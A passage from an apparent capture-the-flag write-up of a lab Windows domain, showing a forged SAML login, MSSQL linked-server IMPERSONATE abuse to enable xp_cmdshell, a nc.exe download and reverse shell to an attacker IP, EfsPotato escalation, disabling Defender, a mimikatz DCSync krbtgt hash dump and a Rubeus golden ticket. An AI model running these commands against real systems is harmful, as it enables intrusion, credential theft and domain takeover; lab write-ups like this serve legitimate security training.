mJ6c0RmalJkSjhFMXVOSldQL2tRQTErd1lsT2RkTHFVM2IwSXNDdmxBOEV2WVcwVDFSc3U3N280eC93MGdXYjBvUVBFSXo3ejk3M2I0OTZ3cVF0M0RueWZlTzNsWFhmWk5jdmFqNUtDUDJUdEdCK0tzaEY5cGtJUHhxN0YyZ01oN1FqeGpSSHNBMjlWOGpGbzlnTEQ3a1BWaWNhSVVkc2dpRkhuWVFGMTRhNTJKdFIxVjVpTitoOTVKa3V1RXFRV0RCSEF2UEVCQlprRVpIKzV5VCthQ0ZYWFgrQnBQdDNRR2pZTGVKVThDRnNNdG44UVZMWXZMZGNWUnNVblJoL1dIaVh3Sk9PRVZFQ2E5dzcveVZuaGFsQ05CeDFFL2w0S1FJREFRQUJNQTBHQ1NxR1NJYjNEUUVCQ3dVQUE0SUNBUUFXWUtaVzNjRENCTzZkVDN5ZmwzT2N1eXAxTFZLVkkrOXBGeC9iYldwV2pTZGg2YjM5TFR4eEQ3RllVdGh1V1BaM3JGNEcrRmRNRkhIQ3gzWXBFbVVGbkVMS3NYcWhaOTg5QVg1OEkvM21iZlVsS1dlSVBMU0xrcCtlUlpvTUprdDdrMS9LWHREYXNPUW4wTnNnWUVvd0xCSW1NQ011OXV1am5DbUZPd0hQL0lCaGdZUU1IaDQ2QnpTWFdQM2k4VlhiclJ0RHBvL2MvL09GSmhHbW5uRjhaUG1pNHh0emZTREJwVktxd1ZMcDc4Q2d1TXhqUWQrYmRVYjQ1NTg4Wko0Q0xzUGRSUXAzMFdKMS9DTklhZW52Sld0QTJHNUladzVVMEVXQ0pMb1lKV0ZzOWl5T2ExL3k1NXJ1VzZKOGxJR0Qwd21vRWVDbDlDSDFFZDRkelVkVVhmMU1CQ1lQM1g5MmlheHpVRTB1cEdkLzFRbzZIVHl5T2xXdUF3cmtUMlZIRUxLVlpLT2c4K2RseTk3Z3laSWZVdFF3SWtQd05sOHZvMDRjZmoraHpPdkJ6UEtBQVloMTROTGd2ZUFJL0RxTW5PME9LTyt3MUhCS3c2NE5CQ244Z29hekYrUHVGZlVPMHlOSEZMNGt4TXBjYXA2aWV2NmczQlhDU0R3ZnFUVU9FdUVzN3E5b1lLZ3EycW5OVk9USWhoSW5NWEJ6RW02aVAxM2pmdU9vWEpkUEFuRVVYbjR5NXl3QTk3cnRiR25aRVB5eDFmMUVrWC9oYnFCUDR2b2d2OWtsdGFVRUVWWGtTK2hQcHhabWV4Q05yQkQxcTdHSi81MGViWWxDMENldjh3Nk1zOHRNME9ydnBwR1lsV3J0UHdldkV2ZmlSa3dCTEc3RU1BbkxTdz09PC9kczpYNTA5Q2VydGlmaWNhdGU%2BPC9kczpYNTA5RGF0YT48L2RzOktleUluZm8%2BPC9kczpTaWduYXR1cmU%2BPFN1YmplY3Q%2BPE5hbWVJRCBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjEuMTpuYW1laWQtZm9ybWF0OmVtYWlsQWRkcmVzcyI%2BQWRtaW5pc3RyYXRvckBnaG9zdC5odGI8L05hbWVJRD48U3ViamVjdENvbmZpcm1hdGlvbiBNZXRob2Q9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjbTpiZWFyZXIiPjxTdWJqZWN0Q29uZmlybWF0aW9uRGF0YSBOb3RPbk9yQWZ0ZXI9IjIwMjYtMDMtMjNUMjE6MDE6NTMuMDAwWiIgUmVjaXBpZW50PSJodHRwczovL2NvcmUuZ2hvc3QuaHRiOjg0NDMvYWRmcy9zYW1sL3Bvc3RSZXNwb25zZSIvPjwvU3ViamVjdENvbmZpcm1hdGlvbj48L1N1YmplY3Q%2BPENvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDI2LTAzLTIzVDIwOjU2OjUzLjAwMFoiIE5vdE9uT3JBZnRlcj0iMjAyNi0wMy0yM1QyMTo1Njo1My4wMDBaIj48QXVkaWVuY2VSZXN0cmljdGlvbj48QXVkaWVuY2U%2BaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzPC9BdWRpZW5jZT48L0F1ZGllbmNlUmVzdHJpY3Rpb24%2BPC9Db25kaXRpb25zPjxBdHRyaWJ1dGVTdGF0ZW1lbnQ%2BPEF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy91cG4iPjxBdHRyaWJ1dGVWYWx1ZT5BZG1pbmlzdHJhdG9yQGdob3N0Lmh0YjwvQXR0cmlidXRlVmFsdWU%2BPC9BdHRyaWJ1dGU%2BPEF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy9jbGFpbXMvQ29tbW9uTmFtZSI%2BPEF0dHJpYnV0ZVZhbHVlPkFkbWluaXN0cmF0b3I8L0F0dHJpYnV0ZVZhbHVlPjwvQXR0cmlidXRlPjwvQXR0cmlidXRlU3RhdGVtZW50PjxBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMjYtMDMtMjNUMjA6NTY6NTIuNTAwWiIgU2Vzc2lvbkluZGV4PSJfR0c5SlVTIj48QXV0aG5Db250ZXh0PjxBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3NlczpQYXNzd29yZFByb3RlY3RlZFRyYW5zcG9ydDwvQXV0aG5Db250ZXh0Q2xhc3NSZWY%2BPC9BdXRobkNvbnRleHQ%2BPC9BdXRoblN0YXRlbWVudD48L0Fzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg%3D%3D
```

we add the blob into burp post request:
![[Pasted image 20260323135948.png]]
![[Pasted image 20260323135920.png]]


and we take the cookie from the response and enter it into `core.ghost.htb:8443`:
![[Pasted image 20260323140102.png]]

lets run some commands:
```bash
select current_user
sp_linkedservers
select host_name();
select * from openquery([PRIMARY], 'select host_name()')
select * from openquery([PRIMARY], 'exec xp_cmdshell "whoami"')
select * from openquery([PRIMARY], 'select grantee.name, perm.permission_name from sys.server_permissions perm JOIN sys.server_principals AS grantee ON grantee.principal_id = perm.grantee_principal_id')
select * from openquery([PRIMARY], 'select grantee.name AS grantee, grantor.name AS grantor, perm.permission_name from sys.server_permissions perm JOIN sys.server_principals AS grantor ON grantor.principal_id = perm.grantor_principal_id
JOIN sys.server_principals AS grantee ON grantee.principal_id = perm.grantee_principal_id')
select * from openquery([PRIMARY], 'select * from sys.server_principals')
```

and here is the misconfiguration we are looking for **`sa(the grantor)`** has granted **`bridge_corp(the grantee)`** the **`IMPERSONATE`** permission :
```SQL
{
    "recordsets": [
        [
            {
                "grantee": "sa",
                "grantor": "sa",
                "permission_name": "CONNECT SQL"
            },
            {
                "grantee": "public",
                "grantor": "sa",
                "permission_name": "VIEW ANY DATABASE"
            },
            {
                "grantee": "bridge_corp",
                "grantor": "sa",
                "permission_name": "CONNECT SQL"
            },
            {
                "grantee": "bridge_corp",
                "grantor": "sa",
                "permission_name": "IMPERSONATE"
            },
            {
                "grantee": "public",
                "grantor": "sa",
                "permission_name": "CONNECT"
            },
            {
                "grantee": "public",
                "grantor": "sa",
                "permission_name": "CONNECT"
            },
            {
                "grantee": "public",
                "grantor": "sa",
                "permission_name": "CONNECT"
            },
            {
                "grantee": "public",
                "grantor": "sa",
                "permission_name": "CONNECT"
            }
        ]
    ],
    "recordset": [
        {
            "grantee": "sa",
            "grantor": "sa",
            "permission_name": "CONNECT SQL"
        },
        {
            "grantee": "public",
            "grantor": "sa",
            "permission_name": "VIEW ANY DATABASE"
        },
        {
            "grantee": "bridge_corp",
            "grantor": "sa",
            "permission_name": "CONNECT SQL"
        },
        {
            "grantee": "bridge_corp",
            "grantor": "sa",
            "permission_name": "IMPERSONATE"
        },
        {
            "grantee": "public",
            "grantor": "sa",
            "permission_name": "CONNECT"
        },
        {
            "grantee": "public",
            "grantor": "sa",
            "permission_name": "CONNECT"
        },
        {
            "grantee": "public",
            "grantor": "sa",
            "permission_name": "CONNECT"
        },
        {
            "grantee": "public",
            "grantor": "sa",
            "permission_name": "CONNECT"
        }
    ],
    "output": {},
    "rowsAffected": [
        8
    ]
}
```

lets check one last thing to make it clearer:
```SQL
select * from openquery([PRIMARY], 'select grantee.name AS grantee, grantor.name AS grantor, perm.permission_name from sys.server_permissions perm JOIN sys.server_principals AS grantor ON grantor.principal_id = perm.grantor_principal_id
JOIN sys.server_principals AS grantee ON grantee.principal_id = perm.grantee_principal_id where grantee.name = current_user')

{
    "recordsets": [
        [
            {
                "grantee": "bridge_corp",
                "grantor": "sa",
                "permission_name": "CONNECT SQL"
            },
            {
                "grantee": "bridge_corp",
                "grantor": "sa",
                "permission_name": "IMPERSONATE"
            }
        ]
    ],
    "recordset": [
        {
            "grantee": "bridge_corp",
            "grantor": "sa",
            "permission_name": "CONNECT SQL"
        },
        {
            "grantee": "bridge_corp",
            "grantor": "sa",
            "permission_name": "IMPERSONATE"
        }
    ],
    "output": {},
    "rowsAffected": [
        2
    ]
}
```

not lets see if we can enable xp_cmdshell:
```SQL
EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE; REVERT;') AT [PRIMARY]

and now we test it

EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''whoami''; REVERT;') AT [PRIMARY]


{
    "recordsets": [
        [
            {
                "output": "nt service\\mssqlserver"
            },
            {
                "output": null
            }
        ]
    ],
    "recordset": [
        {
            "output": "nt service\\mssqlserver"
        },
        {
            "output": null
        }
    ],
    "output": {},
    "rowsAffected": [
        2
    ]
}
```

se we get a shell:
```SQL
exec ('execute as login = ''sa''; exec xp_cmdshell ''curl.exe
http://10.10.15.113/nc.exe -o C:\windows\temp\nc.exe''') at "PRIMARY"

exec ('execute as login = ''sa''; exec xp_cmdshell ''C:\windows\temp\nc64.exe -e
powershell 10.10.15.113 9001''') at "PRIMARY"
```

our machine:
```powershell
rlwrap nc -lvnp 9001                          
listening on [any] 9001 ...
connect to [10.10.15.113] from (UNKNOWN) [10.129.10.74] 49932
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami /all
whoami /all

USER INFORMATION
----------------

User Name              SID                                                            
====================== ===============================================================
nt service\mssqlserver S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                   
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT SERVICE\ALL SERVICES                    Well-known group S-1-5-80-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
PS C:\Windows\system32> 
```

we use Potato here since we have SeImpersonatePrivilege:

```bash
wget https://raw.githubusercontent.com/zcgonvh/EfsPotato/refs/heads/master/EfsPotato.cs
--2026-03-23 22:43:39--  https://raw.githubusercontent.com/zcgonvh/EfsPotato/refs/heads/master/EfsPotato.cs
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 25441 (25K) [text/plain]
Saving to: ‘EfsPotato.cs’

EfsPotato.cs                                               100%[========================================================================================================================================>]  24.84K  --.-KB/s    in 0.002s  

2026-03-23 22:43:39 (13.3 MB/s) - ‘EfsPotato.cs’ saved [25441/25441]

python3 -m http.server 80                                                              
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.10.74 - - [23/Mar/2026 22:44:49] "GET /EfsPotato.cs HTTP/1.1" 200 -
```


```powershell
PS C:\users\public\temp> wget 10.10.15.113/EfsPotato.cs -usebasicparsing -O EfsPotato.cs
wget 10.10.15.113/EfsPotato.cs -usebasicparsing -O EfsPotato.cs
PS C:\users\public\temp> C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs
Microsoft (R) Visual C# Compiler version 4.8.4161.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

EfsPotato.cs(123,29): warning CS0618: 'System.IO.FileStream.FileStream(System.IntPtr, System.IO.FileAccess, bool)' is obsolete: 'This constructor has been deprecated.  Please use new FileStream(SafeFileHandle handle, FileAccess access) instead, and optionally make a new SafeFileHandle with ownsHandle=false if needed.  http://go.microsoft.com/fwlink/?linkid=14202'
PS C:\users\public\temp> .\EfsPotato.exe 'C:\windows\temp\nc.exe 10.10.15.113 9001 -e powershell.exe'
.\EfsPotato.exe 'C:\windows\temp\nc.exe 10.10.15.113 9001 -e powershell.exe'
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=1a546220)
[+] Get Token: 912
[!] process with pid: 2008 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818
```

now we get our shell:
```powershell
rlwrap nc -lvnp 9001                                                                                 
listening on [any] 9001 ...
connect to [10.10.15.113] from (UNKNOWN) [10.129.10.74] 49900
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\users\public\temp> whoami /all
whoami /all

USER INFORMATION
----------------

User Name           SID     
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner    
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeCreateTokenPrivilege                    Create a token object                                              Enabled
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Enabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeAuditPrivilege                          Generate security audits                                           Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeTrustedCredManAccessPrivilege           Access Credential Manager as a trusted caller                      Enabled
SeRelabelPrivilege                        Modify an object label                                             Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
PS C:\users\public\temp>
```

first lets disable Defender:
```powershell
PS C:\users\public\temp> Set-MpPreference -DisableRealtimeMonitoring $True
Set-MpPreference -DisableRealtimeMonitoring $True
```

now lets upload mimikatz and run it:
```powershell
PS C:\users\public\temp> wget 10.10.15.113/mimikatz.exe -usebasicparsing -O mimikatz.exe
wget 10.10.15.113/mimikatz.exe -usebasicparsing -O mimikatz.exe
PS C:\users\public\temp> .\mimikatz.exe 'lsadump::dcsync /user:krbtgt@corp.ghost.htb'
.\mimikatz.exe 'lsadump::dcsync /user:krbtgt@corp.ghost.htb'

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync /user:krbtgt@corp.ghost.htb
[DC] 'corp.ghost.htb' will be the domain
[DC] 'PRIMARY.corp.ghost.htb' will be the DC server
[DC] 'krbtgt@corp.ghost.htb' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 1/31/2024 7:34:01 PM
Object Security ID   : S-1-5-21-2034262909-2733679486-179904498-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 69eb46aa347a8c68edb99be2725403ab
    ntlm- 0: 69eb46aa347a8c68edb99be2725403ab
    lm  - 0: fceff261045c75c4d7f6895de975f6cb

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4acd753922f1e79069fd95d67874be4c

* Primary:Kerberos-Newer-Keys *
    Default Salt : CORP.GHOST.HTBkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d
      aes128_hmac       (4096) : ea18711cfd69feef0c8efba75bca9235
      des_cbc_md5       (4096) : b3e070025110ce1f

* Primary:Kerberos *
    Default Salt : CORP.GHOST.HTBkrbtgt
    Credentials
      des_cbc_md5       : b3e070025110ce1f

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  673e591f1e8395d5bf9069b7ddd084d6
    02  1344e8aade9169b015f2ca4ddf8a04bd
    03  021a6b424b5372ef3511673b04647862
    04  673e591f1e8395d5bf9069b7ddd084d6
    05  1344e8aade9169b015f2ca4ddf8a04bd
    06  122def4643832d604a97c9c02e29cb38
    07  673e591f1e8395d5bf9069b7ddd084d6
    08  2526b041b761a9ae973e69ee23d8ab97
    09  2526b041b761a9ae973e69ee23d8ab97
    10  43c410fd94dc2ca31c3d12cd76ea5e5c
    11  b51d328dbb94b922331d54ffd54134d5
    12  2526b041b761a9ae973e69ee23d8ab97
    13  99c658551700bb8b4dbe0503acade3cb
    14  b51d328dbb94b922331d54ffd54134d5
    15  8a1e17a5a2aa32b2120a39ba99881020
    16  8a1e17a5a2aa32b2120a39ba99881020
    17  9ebecd6b439ee2e7847819e54be70d8f
    18  ff83c6eb25c8da26d5332aeeaeae4cb8
    19  2ee6795b19f71e9c5aa2ab2f902a0c55
    20  3722d9593e0e483720a657bcb56526b2
    21  7bdac8f5dfed431bc7232ff1ca6ebb4d
    22  7bdac8f5dfed431bc7232ff1ca6ebb4d
    23  42b46cd4462f0d4c4ae5da7757a2ff90
    24  7648ab0ac431ceada83b321ca468fccf
    25  7648ab0ac431ceada83b321ca468fccf
    26  7af11e3e17a21afd61955ed5a5f52405
    27  9dfbb554b398bdf2e8c51e1b20208c08
    28  49a35ae4b703b7c47b44708fa235c581
    29  8a24eb5a1a3155556064b79149b00211

mimikatz # 
```

now we get Rubeus on the machine to make out ticket:
```powershell
PS C:\users\public\temp> wget 10.10.15.113/Rubeus.exe -usebasicparsing -O Rubeus.exe
wget 10.10.15.113/Rubeus.exe -usebasicparsing -O Rubeus.exe
PS C:\users\public\temp> .\Rubeus.exe golden /aes256:b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d /ldap /user:Administrator /sids:S-1-5-21-4084500788-938703357-3654145966-519 /ptt
.\Rubeus.exe golden /aes256:b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d /ldap /user:Administrator /sids:S-1-5-21-4084500788-938703357-3654145966-519 /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: Build TGT

[*] Trying to query LDAP using LDAPS for user information on domain controller PRIMARY.corp.ghost.htb
[X] Error binding to LDAP server: The LDAP server is unavailable.
[!] LDAPS failed, retrying with plaintext LDAP.
[*] Searching path 'LDAP://PRIMARY.corp.ghost.htb/DC=corp,DC=ghost,DC=htb' for '(samaccountname=Administrator)'
[*] Retrieving group and domain policy information over LDAP from domain controller PRIMARY.corp.ghost.htb
[*] Searching path 'LDAP://PRIMARY.corp.ghost.htb/DC=corp,DC=ghost,DC=htb' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=corp,DC=ghost,DC=htb)(distinguishedname=CN=Domain Admins,CN=Users,DC=corp,DC=ghost,DC=htb)(distinguishedname=CN=Administrators,CN=Builtin,DC=corp,DC=ghost,DC=htb)(objectsid=S-1-5-21-2034262909-2733679486-179904498-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
[*] Attempting to mount: \\primary.corp.ghost.htb\SYSVOL
[*] \\primary.corp.ghost.htb\SYSVOL successfully mounted
[*] Attempting to unmount: \\primary.corp.ghost.htb\SYSVOL
[*] \\primary.corp.ghost.htb\SYSVOL successfully unmounted
[*] Retrieving netbios name information over LDAP from domain controller PRIMARY.corp.ghost.htb
[*] Searching path 'LDAP://PRIMARY.corp.ghost.htb/CN=Configuration,DC=ghost,DC=htb' for '(&(netbiosname=*)(dnsroot=corp.ghost.htb))'
[*] Building PAC

[*] Domain         : CORP.GHOST.HTB (GHOST-CORP)
[*] SID            : S-1-5-21-2034262909-2733679486-179904498
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ExtraSIDs      : S-1-5-21-4084500788-938703357-3654145966-519
[*] ServiceKey     : B0EB79F35055AF9D61BCBBE8CCAE81D98CF63215045F7216FFD1F8E009A75E8D
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : B0EB79F35055AF9D61BCBBE8CCAE81D98CF63215045F7216FFD1F8E009A75E8D
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : corp.ghost.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@corp.ghost.htb'

[*] AuthTime       : 3/23/2026 4:40:49 PM
[*] StartTime      : 3/23/2026 4:40:49 PM
[*] EndTime        : 3/24/2026 2:40:49 AM
[*] RenewTill      : 3/30/2026 4:40:49 PM

[*] base64(ticket.kirbi):

      doIF1TCCBdGgAwIBBaEDAgEWooIEujCCBLZhggSyMIIErqADAgEFoRAbDkNPUlAuR0hPU1QuSFRCoiMw
      IaADAgECoRowGBsGa3JidGd0Gw5jb3JwLmdob3N0Lmh0YqOCBG4wggRqoAMCARKhAwIBA6KCBFwEggRY
      5Tj7SjdEW9SPXQj7cGEbYB9VzseFboMbfhNDfAu++TnPX+cKn4pML0Rlbvp9/jmFfiPIkqd0B2nJBql9
      HT8TPQl7JWKyEScy6LCX5NXNtaZEIeQV9b7dnDo6rwscFqhD0Zl/eOATAP7ZYQOJZRmpY0rp6TeXTo2E
      iDI+OzR/zfiJTHfU1QBrq8mXmdUXtHjEQF0nAyWJ1az6KxlwcrRWt0y+uABKR5KfKeqQ9CLHrfxbiVlj
      RodhsYyoDEbUpqhi3FmbWSxohwGb70HazFuxxJhgfpspwhk3QpxWS+kgOEvKzDfKHAXusssl1KjY0NtE
      CXaIJVAMyI4U56mksUZyn8699BDtyOQWq0f+zzKpm4pD+6VA/bZXvwDpdrPAKtXppVr2X3ovuoYLc++T
      e3cYzeeRZA62eXTqTHkn/nilKu1yt94XwJ61InQHv3ogyHz+cw+e7+D7HX77mXhGWJlEVMh9mheMf2Q9
      N7vpWCMdm5oyBgJ9N/TJrttoHdxjo8w70ELGpEgIZEb7jCeodXGq/YgQHnR8zbLaNTLhl4KzIy0dcLMA
      TkXvZtv8ZUMKMQt5Y4v+tm6QgWHmECeKuES74AF7EhEsjlYkh0oesRIP5lEnNLTNiO2HHRhWvzO5p0ZW
      DY/9o6Ts2ueldplud/BLKPm7wO5i6VoYDLjjHFg0VGxgoOX+l/AqlmSyTeAndgvmlZX2uV9MqxwwZ2Q/
      HhihTjSSIiTzuKC1lRmSb3DtZb9ZzgCJgtlI6C6eFKRo87eZL+4NNSpYi9GGqa5hudu2fy9lgqP6ra/S
      fLLQzdw4Rx8/8Ln2MMGOjMKdAupPvNQ9fcOPWZmR6PwQ5LfnDvrW0F+Mu5ktu5aZVJwQ44KQ7SQLLppY
      ex6PsF8DSB09teb6dIVokW7ZSaxFBC5gvs0lOR+bWSpnT+Fnclysxq+pqR00146njOSL6P+6wJRUOXa+
      T0gO00PbdYtQSiCIqDyD4YUdWyNRI5JBqXokVadxgwf6z/ACTKH3KMyDGahe51eDLzWu9s2emfRVP5no
      RvgyM3LK5FQpyNZuetRMeqi0nEWkbNXDur6MFftiYsd8xYkl+DqfViWO8tgUg7+CQzgI+zsbY5CoU8yH
      qahh1kxLR0U+EmGySoSY3RIaPb+dqiJZBgy5mP79IyDZ0fvQpv1+dKAboBDZnOvIuvPVxsGdIszFowiH
      VE33XXBBd+TcgywwaHxS2FPdAFlup5qKwDBKBT1cN+S1RkEV+6Fs4fYwVwg465pYjoXSlS8IT8GVmQ56
      LdTUtPTAlueOaK1NCaQxwWvWH0/rF2ucVgQdvke7o4HB+UFfSTPTvaUhtGgYH1GNUa07KrfbNI8pzJtK
      dNiLh319yCASSw7WsKDSQ5diwlxB2bdZ08uxYw2V3sx63Uxnc35HnLprCCdw/q5MTAKhn0yWwX4DNp1E
      LoE0Ha8A+RX51iIC4yZfo2O7r41FVr2pvpNXBlmpWjujggEFMIIBAaADAgEAooH5BIH2fYHzMIHwoIHt
      MIHqMIHnoCswKaADAgESoSIEIANr+B/bNFl1tYnhEetAAoH8ffPbWhVrzXCfCV4czievoRAbDkNPUlAu
      R0hPU1QuSFRCohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOAAAKQRGA8yMDI2MDMyMzIz
      NDA0OVqlERgPMjAyNjAzMjMyMzQwNDlaphEYDzIwMjYwMzI0MDk0MDQ5WqcRGA8yMDI2MDMzMDIzNDA0
      OVqoEBsOQ09SUC5HSE9TVC5IVEKpIzAhoAMCAQKhGjAYGwZrcmJ0Z3QbDmNvcnAuZ2hvc3QuaHRi


[+] Ticket successfully imported!
PS C:\users\public\temp> dir \\dc01.ghost.htb\c$\Users\Administrator\Desktop
dir \\dc01.ghost.htb\c$\Users\Administrator\Desktop


    Directory: \\dc01.ghost.htb\c$\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-ar---         3/22/2026   7:21 PM             34 root.txt                                                             


